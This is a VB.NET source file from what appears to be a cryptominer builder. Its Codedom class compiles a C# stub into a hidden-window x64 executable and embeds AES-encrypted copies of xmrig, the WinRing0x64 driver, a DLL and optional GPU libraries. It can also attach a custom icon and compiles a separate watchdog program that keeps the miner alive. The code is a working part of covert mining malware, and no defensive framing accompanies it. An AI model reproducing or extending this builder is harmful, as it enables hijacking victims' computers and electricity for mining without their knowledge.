Imports System.CodeDom.Compiler
Imports System.Security.Cryptography
Imports Microsoft.CSharp

Public Class Codedom
    Public Shared MinerOK As Boolean = False
    Public Shared WatchdogOK As Boolean = False
    Public Shared F As Form1
    Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String, Optional ICOPath As String = "")

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64"

        If ICOPath IsNot Nothing Then
            IO.File.Copy(ICOPath, Environment.GetFolderPath(35) + "\icon.ico", True) 'codedom cant read spaces
            F.txtLog.Text = F.txtLog.Text + ("Adding Icon..." + vbNewLine)
            OP += " /win32icon:" + Environment.GetFolderPath(35) + "\icon.ico"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            .ReferencedAssemblies.Add("System.Management.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")

            F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                R.AddResource(F.Resources_dll, F.AES_Encryptor(My.Resources.Mandark))
                R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
                R.AddResource(F.Resources_winring, F.AES_Encryptor(My.Resources.WinRing0x64))
                If F.chkInstall.Checked And F.toggleWatchdog.Checked Then
                    R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata))
                End If
                If (F.toggleEnableGPU.Checked) Then
                    R.AddResource(F.Resources_libs, F.AES_Encryptor(My.Resources.libs))
                End If
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text + ("Embedding resources..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + F.Resources_Parent + ".Resources")

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                MinerOK = False
                Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
                Return
            Else
                MinerOK = True
                Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
            End If
        End With

    End Sub

    Public Shared Sub WatchdogCompiler(ByVal Path As String, ByVal Code As String)

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64"

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            .ReferencedAssemblies.Add("System.Management.dll")

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                WatchdogOK = False
            Else
                WatchdogOK = True
            End If
        End With

    End Sub
End Class
